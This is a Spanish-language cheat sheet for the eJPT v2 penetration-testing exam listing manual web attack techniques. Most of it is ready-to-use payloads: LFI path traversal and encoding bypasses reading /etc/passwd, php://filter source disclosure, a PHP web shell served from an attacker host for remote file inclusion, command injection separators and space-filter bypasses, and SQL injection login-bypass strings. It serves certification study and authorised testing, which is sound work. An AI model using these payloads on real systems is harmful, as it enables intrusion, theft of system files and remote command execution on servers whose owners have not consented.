# Vulnerabilidades Web Manuales (Guía eJPT v2)

Técnicas de identificación y explotación manual de vulnerabilidades web comunes (LFI, RFI, Command Injection y Bypasses de Login) evaluadas en eJPT v2.

---

## 1. Local File Inclusion (LFI)

Ocurre cuando una aplicación web incluye archivos locales usando parámetros manipulables (ej. `?page=about.php`).

### Payloads Básicos de Path Traversal
```text
http://<IP_OBJETIVO>/index.php?page=../../../../etc/passwd
http://<IP_OBJETIVO>/index.php?page=../../../../boot.ini
http://<IP_OBJETIVO>/index.php?page=../../../../windows/win.ini
```

### Bypasses Comunes
* **Bypass de extensión nula (`%00`)** (PHP < 5.3.4):
  `http://<IP_OBJETIVO>/index.php?page=../../../../etc/passwd%00`
* **Codificación URL doble**:
  `http://<IP_OBJETIVO>/index.php?page=..%252f..%252f..%252fetc%252fpasswd`

### Wrappers de PHP (PHP Wrappers)
* **Lectura de código fuente en Base64 (`php://filter`)**:
  Permite descargar el código de páginas `.php` sin que el servidor las ejecute:
  ```text
  http://<IP_OBJETIVO>/index.php?page=php://filter/convert.base64-encode/resource=config.php
  ```
  *(Decodificar la respuesta con: `echo "BASE64_STRING" | base64 -d`)*

---

## 2. Remote File Inclusion (RFI)

Permite incluir un script PHP remoto alojado en el equipo del atacante.

1. **Iniciar servidor web en máquina atacante**:
   ```bash
   python3 -m http.server 80
   ```
2. Crear un script `shell.txt` o `shell.php` con el payload:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. **Inclusión remota**:
   ```text
   http://<IP_OBJETIVO>/index.php?page=http://<IP_ATACANTE>/shell.txt&cmd=whoami
   ```

---

## 3. Inyección de Comandos (Command Injection)

Ocurre cuando la aplicación web pasa parámetros ingresados por el usuario directamente a una shell del sistema (ej. función `system()`, `exec()`, `passthru()`).

### Separadores de Comandos
Prueba adjuntar operadores de comando en campos de texto (formularios, pings web, etc.):

* `;` : `127.0.0.1; whoami` (Linux)
* `|` : `127.0.0.1 | whoami` (Linux / Windows)
* `&&` : `127.0.0.1 && whoami` (Linux / Windows)
* `` ` `` : `127.0.0.1 `whoami`` (Linux)
* `$()` : `127.0.0.1 $(whoami)` (Linux)

### Bypasses de Espacio en Command Injection
Si la aplicación filtra espacios:
* Linux: usar la variable interna `${IFS}`:
  ```bash
  127.0.0.1;cat${IFS}/etc/passwd
  ```
* Redirección de entrada:
  ```bash
  127.0.0.1;cat</etc/passwd
  ```

---

## 4. SQL Injection Manual (SQLi) Básica

### Prueba de Comprobación
Insertar caracteres especiales en campos de login o búsqueda para forzar un error SQL:
```text
'
"
' OR 1=1 -- -
" OR 1=1 -- -
' OR '1'='1
```

### Bypass de Formularios de Login
Probar en el campo de `Username` o `Email`:
```text
admin' -- -
admin' #
' OR 1=1 LIMIT 1 -- -
```
